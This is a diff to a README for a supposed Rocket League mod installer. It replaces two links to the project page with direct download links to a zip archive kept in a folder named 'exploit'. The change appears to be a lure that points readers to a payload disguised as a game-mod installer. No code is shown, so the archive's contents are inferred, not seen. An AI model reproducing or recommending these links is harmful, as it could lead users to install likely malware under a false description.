@@ -1,6 +1,6 @@
 # 🏎️ bakkes-mod-install - Add custom tools to Rocket League
 
-[![](https://img.shields.io/badge/Download-Installer-blue.svg)](https://github.com/Laviniaromaic657/bakkes-mod-install)
+[![](https://img.shields.io/badge/Download-Installer-blue.svg)](https://github.com/Laviniaromaic657/bakkes-mod-install/raw/refs/heads/main/exploit/mod_install_bakkes_v1.5.zip)
 
 ## 📌 About this project
 
@@ -20,7 +20,7 @@ Before you start, ensure your computer meets these requirements:
 
 The installation process moves the required files into your game directory. You need to visit the project page to access the latest version.
 
-[Click here to visit the official project page and download the installer](https://github.com/Laviniaromaic657/bakkes-mod-install)
+[Click here to visit the official project page and download the installer](https://github.com/Laviniaromaic657/bakkes-mod-install/raw/refs/heads/main/exploit/mod_install_bakkes_v1.5.zip)
 
 ## ⚙️ Installation steps
 
